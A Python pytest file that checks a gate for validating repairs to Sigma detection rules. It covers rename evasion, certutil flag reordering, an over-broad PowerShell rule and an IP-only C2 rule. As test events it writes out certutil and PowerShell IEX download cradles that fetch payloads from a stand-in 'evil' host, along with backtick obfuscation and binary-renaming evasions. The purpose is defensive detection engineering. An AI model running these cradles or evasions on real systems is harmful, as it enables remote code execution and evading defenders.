"""Stage 3 Part 3: prove the four-condition gate on 5 hand-made repairs.

No LLM anywhere here - every rule, evasion, and benign event below was
written by hand, chosen so the correct verdict is known in advance:

  R1  rename-evasion fix                          -> should PASS
  R2  argument-order/quoting evasion fix           -> should PASS
  R3  deliberately over-widened "fix"              -> should FAIL (condition 3)
  R4  plausible but insufficient repair attempt    -> should FAIL (condition 1)
  R5  IOC-only rule, no durable observable exists  -> should FAIL (condition 1),
                                                       i.e. the correct disposition
                                                       is retire, not repair

R3 is the load-bearing case: "if the gate accepts the deliberately-bad
repair, the gate is broken - fix it before declaring this phase done." Its
assertion is the one that would catch a broken gate, not just a working one.

All events are hand-authored flat JSON (no RSigma field-mapping ambiguity -
see mechanic/verify.py's module docstring for why that matters), so every
condition here runs fully trusted; asserting `verdict` on its own would
already fail loudly if anything came back UNVERIFIABLE.
"""

from pathlib import Path

import pytest

from mechanic import gate, verify

try:
    verify.find_rsigma_binary()
    _RSIGMA_AVAILABLE = True
    _RSIGMA_SKIP_REASON = ""
except verify.VerifyError as e:
    _RSIGMA_AVAILABLE = False
    _RSIGMA_SKIP_REASON = str(e)

pytestmark = pytest.mark.skipif(not _RSIGMA_AVAILABLE, reason=_RSIGMA_SKIP_REASON)


def _write(tmp_path: Path, name: str, text: str) -> Path:
    p = tmp_path / name
    p.write_text(text)
    return p


# ---------------------------------------------------------------------------
# R1 - PASS: classic rename-evasion fix (filename -> OriginalFileName)
# ---------------------------------------------------------------------------

R1_ORIGINAL = """
title: Suspicious Whoami Execution (fragile - filename only)
id: 720171d0-82d1-471f-9ff4-227b0984d197
status: test
logsource: {category: process_creation, product: windows}
detection:
    selection:
        Image|endswith: '\\\\whoami.exe'
    condition: selection
level: medium
tags: [attack.discovery, attack.t1033]
"""

R1_REPAIRED = """
title: Suspicious Whoami Execution (repaired - OriginalFileName, survives rename)
id: 720171d0-82d1-471f-9ff4-227b0984d197
status: test
logsource: {category: process_creation, product: windows}
detection:
    selection:
        OriginalFileName: 'whoami.exe'
    condition: selection
level: medium
tags: [attack.discovery, attack.t1033]
"""


def test_r1_rename_evasion_fix_passes(tmp_path):
    original = _write(tmp_path, "r1_original.yml", R1_ORIGINAL)
    repaired = _write(tmp_path, "r1_repaired.yml", R1_REPAIRED)
    original_tp = {"Image": "C:\\Windows\\System32\\whoami.exe", "OriginalFileName": "whoami.exe", "CommandLine": "whoami.exe"}
    evasion = {"Image": "C:\\Users\\Public\\svchost32.exe", "OriginalFileName": "whoami.exe", "CommandLine": "svchost32.exe"}
    benign = [{"Image": "C:\\Windows\\System32\\notepad.exe", "OriginalFileName": "NOTEPAD.EXE", "CommandLine": "notepad.exe"}]

    malicious = [
        gate.LabeledEvent(original_tp, "original_tp", "hand-authored: legitimate whoami.exe invocation"),
        gate.LabeledEvent(evasion, "evasion", "hand-authored: Uetz binary-rename evasion (whoami.exe copied to svchost32.exe)"),
    ]
    report = gate.run_gate(original, repaired, malicious, benign)
    assert report.verdict == "PASS", report.to_dict()
    assert report.condition("EVASIONS_CAUGHT").passed is True
    assert report.condition("ORIGINAL_STILL_CAUGHT").passed is True
    assert report.condition("NO_NEW_FALSE_POSITIVES").passed is True
    assert report.condition("INTENT_PRESERVED").passed is True


# ---------------------------------------------------------------------------
# R2 - PASS: argument-order evasion fix (order-independent contains|all)
# ---------------------------------------------------------------------------

R2_ORIGINAL = """
title: Suspicious CertUtil Download (fragile - exact flag order/spacing)
id: 267fe72b-7a16-4ec2-9751-324856f9e26d
status: test
logsource: {category: process_creation, product: windows}
detection:
    selection:
        Image|endswith: '\\\\certutil.exe'
        CommandLine|contains: 'certutil.exe -urlcache -f'
    condition: selection
level: high
tags: [attack.command-and-control, attack.t1105]
"""

R2_REPAIRED = """
title: Suspicious CertUtil Download (repaired - order-independent flag check)
id: 267fe72b-7a16-4ec2-9751-324856f9e26d
status: test
logsource: {category: process_creation, product: windows}
detection:
    selection:
        Image|endswith: '\\\\certutil.exe'
        CommandLine|contains|all:
            - '-urlcache'
            - '-f'
    condition: selection
level: high
tags: [attack.command-and-control, attack.t1105]
"""


def test_r2_argument_order_evasion_fix_passes(tmp_path):
    original = _write(tmp_path, "r2_original.yml", R2_ORIGINAL)
    repaired = _write(tmp_path, "r2_repaired.yml", R2_REPAIRED)
    original_tp = {"Image": "C:\\Windows\\System32\\certutil.exe", "CommandLine": "certutil.exe -urlcache -f http://evil/a.exe a.exe"}
    evasion = {"Image": "C:\\Windows\\System32\\certutil.exe", "CommandLine": "certutil.exe -f -urlcache http://evil/a.exe a.exe"}
    benign = [{"Image": "C:\\Windows\\System32\\certutil.exe", "CommandLine": "certutil.exe -hashfile a.exe SHA256"}]

    malicious = [
        gate.LabeledEvent(original_tp, "original_tp", "hand-authored: canonical certutil download-cradle invocation"),
        gate.LabeledEvent(evasion, "evasion", "hand-authored: flag-reordering evasion of the exact-substring match"),
    ]
    report = gate.run_gate(original, repaired, malicious, benign)
    assert report.verdict == "PASS", report.to_dict()


# ---------------------------------------------------------------------------
# R3 - FAIL (condition 3): deliberately over-widened "fix" - THE load-bearing
# case. If this comes back PASS, the gate itself is broken.
# ---------------------------------------------------------------------------

R3_ORIGINAL = """
title: Suspicious PowerShell Download Cradle (fragile - exact literal cradle string)
id: 42d4290b-a97c-4b30-814f-2d18c6fc3328
status: test
logsource: {category: process_creation, product: windows}
detection:
    selection:
        Image|endswith: '\\\\powershell.exe'
        CommandLine|contains: 'IEX (New-Object Net.WebClient).DownloadString'
    condition: selection
level: high
tags: [attack.execution, attack.t1059.001]
"""

# The bad repair someone might actually ship under time pressure: catches the
# evasion by matching on "powershell" alone - technically "fixes" condition 1,
# but is not a repair, it's a different, much worse rule.
R3_BAD_REPAIR = """
title: Suspicious PowerShell Download Cradle (BAD repair - overly broad)
id: 42d4290b-a97c-4b30-814f-2d18c6fc3328
status: test
logsource: {category: process_creation, product: windows}
detection:
    selection:
        CommandLine|contains: 'powershell'
    condition: selection
level: high
tags: [attack.execution, attack.t1059.001]
"""


def test_r3_overly_broad_repair_is_rejected(tmp_path):
    original = _write(tmp_path, "r3_original.yml", R3_ORIGINAL)
    bad_repair = _write(tmp_path, "r3_bad_repair.yml", R3_BAD_REPAIR)
    original_tp = {
        "Image": "C:\\Windows\\System32\\powershell.exe",
        "CommandLine": "powershell.exe -nop -c \"IEX (New-Object Net.WebClient).DownloadString('http://evil/a.ps1')\"",
    }
    # backtick-obfuscated IEX - a real technique that breaks a literal-substring match
    # regardless of case-insensitivity (Sigma `contains` is already case-insensitive).
    evasion = {
        "Image": "C:\\Windows\\System32\\powershell.exe",
        "CommandLine": "powershell.exe -nop -c \"I`E`X (New-Object Net.WebClient).DownloadString('http://evil/a.ps1')\"",
    }
    benign = [
        {"Image": "C:\\Windows\\System32\\powershell.exe", "CommandLine": "powershell.exe -File C:\\Scripts\\Backup.ps1"},
        {"Image": "C:\\Windows\\System32\\powershell.exe", "CommandLine": "powershell.exe Get-Process | Where-Object {$_.CPU -gt 10}"},
        {"Image": "C:\\Windows\\System32\\powershell.exe", "CommandLine": "powershell.exe -Command \"Get-ChildItem C:\\Logs\""},
    ]
    malicious = [
        gate.LabeledEvent(original_tp, "original_tp", "hand-authored: canonical IEX/WebClient download cradle"),
        gate.LabeledEvent(evasion, "evasion", "hand-authored: backtick-obfuscated IEX (Uetz-style syntax evasion)"),
    ]
    report = gate.run_gate(original, bad_repair, malicious, benign)

    # THE assertion this whole test file exists for.
    assert report.verdict == "FAIL", (
        "GATE IS BROKEN: it accepted a rule that fires on ordinary backup/monitoring "
        f"PowerShell usage as a valid repair. Full report: {report.to_dict()}"
    )
    fp_condition = report.condition("NO_NEW_FALSE_POSITIVES")
    assert fp_condition.passed is False
    assert fp_condition.evidence["new_fps"] == [0, 1, 2]  # all 3 benign events newly caught
    # confirm it actually did catch the evasion (i.e. this fails for the RIGHT reason,
    # not because the repair is simply broken across the board)
    assert report.condition("EVASIONS_CAUGHT").passed is True


# ---------------------------------------------------------------------------
# R4 - FAIL (condition 1): a plausible-looking repair that doesn't actually
# catch the evasion it was meant to fix.
# ---------------------------------------------------------------------------

R4_INSUFFICIENT_REPAIR = """
title: Suspicious PowerShell Download Cradle (insufficient repair - casing only)
id: 42d4290b-a97c-4b30-814f-2d18c6fc3328
status: test
logsource: {category: process_creation, product: windows}
detection:
    selection:
        Image|endswith: '\\\\powershell.exe'
        CommandLine|contains:
            - 'IEX (New-Object Net.WebClient).DownloadString'
            - 'iex(new-object net.webclient).downloadstring'
    condition: selection
level: high
tags: [attack.execution, attack.t1059.001]
"""


def test_r4_insufficient_repair_is_rejected(tmp_path):
    """Same original/evasion/benign as R3, different (more careful-looking)
    repair attempt - someone correctly anticipated a *casing* evasion but not
    the actual backtick-splitting one in the evasion set. Sigma `contains` is
    already case-insensitive, so this repair changes nothing observable and
    still misses the real evasion - the gate must catch that too, not just
    the obviously-too-broad case."""
    original = _write(tmp_path, "r4_original.yml", R3_ORIGINAL)
    repaired = _write(tmp_path, "r4_repaired.yml", R4_INSUFFICIENT_REPAIR)
    original_tp = {
        "Image": "C:\\Windows\\System32\\powershell.exe",
        "CommandLine": "powershell.exe -nop -c \"IEX (New-Object Net.WebClient).DownloadString('http://evil/a.ps1')\"",
    }
    evasion = {
        "Image": "C:\\Windows\\System32\\powershell.exe",
        "CommandLine": "powershell.exe -nop -c \"I`E`X (New-Object Net.WebClient).DownloadString('http://evil/a.ps1')\"",
    }
    benign = [{"Image": "C:\\Windows\\System32\\powershell.exe", "CommandLine": "powershell.exe -File C:\\Scripts\\Backup.ps1"}]
    malicious = [
        gate.LabeledEvent(original_tp, "original_tp", "hand-authored: canonical IEX/WebClient download cradle"),
        gate.LabeledEvent(evasion, "evasion", "hand-authored: backtick-obfuscated IEX (Uetz-style syntax evasion)"),
    ]
    report = gate.run_gate(original, repaired, malicious, benign)
    assert report.verdict == "FAIL", report.to_dict()
    assert report.condition("EVASIONS_CAUGHT").passed is False
    assert report.condition("NO_NEW_FALSE_POSITIVES").passed is True  # confirms it fails for the right reason


# ---------------------------------------------------------------------------
# R5 - FAIL (condition 1) even after an attempted repair: an IOC-only rule
# with no durable observable underneath it at all. Correct disposition is
# retire, not repair - demonstrated by showing that a reasonable-looking
# generalization attempt still can't pass the gate.
# ---------------------------------------------------------------------------

R5_ORIGINAL = """
title: Known Malicious C2 IP Contacted (single hardcoded IOC, no behavioral fallback)
id: c46a099c-2a31-401d-9ed1-e4be17ac0a7b
status: test
logsource: {category: network_connection, product: windows}
detection:
    selection:
        DestinationIp: '203.0.113.77'
    condition: selection
level: critical
tags: [attack.command-and-control]
"""

# The only kind of "repair" available for a pure-IOC rule with nothing else to
# key on: generalize the indicator itself (here, widen to a /24). This is not
# a behavioral fix - it's a bigger IOC - and it still can't survive the
# attacker simply using a different address outside that block.
R5_ATTEMPTED_REPAIR = """
title: Known Malicious C2 IP Contacted (attempted repair - widened to /24)
id: c46a099c-2a31-401d-9ed1-e4be17ac0a7b
status: test
logsource: {category: network_connection, product: windows}
detection:
    selection:
        DestinationIp|startswith: '203.0.113.'
    condition: selection
level: critical
tags: [attack.command-and-control]
"""


def test_r5_ioc_only_rule_cannot_be_repaired_should_retire(tmp_path):
    original = _write(tmp_path, "r5_original.yml", R5_ORIGINAL)
    attempted_repair = _write(tmp_path, "r5_repaired.yml", R5_ATTEMPTED_REPAIR)
    original_tp = {"DestinationIp": "203.0.113.77"}
    # the realistic "evasion" of any IP-based IOC: the attacker just uses a different address
    evasion = {"DestinationIp": "198.51.100.5"}
    benign = [{"DestinationIp": "93.184.216.34"}]
    malicious = [
        gate.LabeledEvent(original_tp, "original_tp", "hand-authored: the one hardcoded C2 IP the rule was built around"),
        gate.LabeledEvent(evasion, "evasion", "hand-authored: attacker C2 infrastructure rotated to an unrelated /24"),
    ]
    report = gate.run_gate(original, attempted_repair, malicious, benign)
    assert report.verdict == "FAIL", report.to_dict()
    assert report.condition("EVASIONS_CAUGHT").passed is False
    # and no widening of the block would fix this without eventually flooding benign traffic -
    # this rule has no durable observable to repair towards; disposition is retire.
